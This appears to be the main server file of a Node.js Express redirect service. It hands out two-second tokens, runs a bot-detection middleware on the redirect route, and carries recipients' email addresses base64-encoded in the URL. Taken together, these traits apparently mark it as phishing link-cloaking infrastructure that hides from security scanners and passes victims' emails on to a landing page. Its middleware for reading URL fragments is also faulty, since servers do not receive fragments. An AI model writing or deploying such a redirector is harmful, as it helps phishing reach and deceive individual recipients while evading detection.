const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const { botDetectionMiddleware } = require('./middleware/botDetection');
const { redirectController, generateTokenController, generateToken } = require('./controllers/redirect');
const { isValidUrl } = require('./utils/urlUtils');

const app = express();

// Add this near the top with other constants
const DEFAULT_REDIRECT_URL = process.env.DEFAULT_REDIRECT_URL || 'https://example.com';
const DEFAULT_EXPIRE_TIME = 2000; // 2 seconds

// Security middleware
app.use(helmet());
app.use(cors());
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 50 // limit each IP to 50 requests per window
});
app.use(limiter);

app.use((req, res, next) => {
  const hashIndex = req.url.indexOf('#');
  if (hashIndex !== -1) {
    const fragment = req.url.slice(hashIndex + 1); // Extract everything after '#'
    const rawFragment = fragment.slice(1); // Remove the first letter after '#'

    // Attempt to decode email (base64 or raw)
    try {
      const email = Buffer.from(rawFragment, 'base64').toString('utf8');
      req.email = email; // Attach decoded email to the request object
    } catch (error) {
      console.error('Error decoding email:', error);
      return res.status(400).send('Invalid email format');
    }
  }
  next();
});

// Routes
app.post('/generate', limiter, generateTokenController);
app.get('/r/:token/:base64Email?', botDetectionMiddleware, redirectController);

// Default route to handle Base64 email
app.get('/:base64Email?', limiter, async (req, res) => {
  try {
    const base64Email = req.params.base64Email;
    let email = '';

    if (base64Email) {
      email = Buffer.from(base64Email, 'base64').toString('utf8');
    }

    if (!isValidUrl(DEFAULT_REDIRECT_URL)) {
      throw new Error('Invalid default URL');
    }

    // Generate a token for the default URL
    const token = generateToken(DEFAULT_REDIRECT_URL, DEFAULT_EXPIRE_TIME);

    // Redirect to the /r/:token route with the Base64 email appended if provided
    const redirectUrl = base64Email ? `/r/${token}/${base64Email}` : `/r/${token}`;
    res.redirect(redirectUrl);
  } catch (error) {
    console.error('Default redirect error:', error);
    res.status(500).json({ error: 'Failed to generate default redirect' });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
